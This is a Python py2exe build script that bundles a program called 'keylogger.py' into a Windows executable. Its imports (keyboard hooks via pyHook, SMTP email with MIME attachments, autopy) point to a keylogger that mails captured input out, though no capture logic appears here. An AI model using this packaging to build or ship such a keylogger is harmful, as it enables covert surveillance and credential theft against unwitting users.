from distutils.core import setup
import py2exe
import pyHook, pythoncom
import autopy
import threading
import os.path
import os
import smtplib
import email
import time
from email.MIMEMultipart import MIMEMultipart
from email.Utils import COMMASPACE
from email.MIMEBase import MIMEBase
from email.parser import Parser
from email.MIMEImage import MIMEImage
from email.MIMEText import MIMEText
from email.MIMEAudio import MIMEAudio
import mimetypes
import win32event, win32api, winerror

setup(console = ['keylogger.py'], 
      options={"py2exe":{"includes":["email.mime.multipart","email.mime.text",
                                     "email.mime.image", "email.mime.audio", "sys",
                                     "os", "email", "smtplib", "mimetypes",
                                     "threading", "pyHook", "pythoncom",
                                     "time", "autopy"]}})
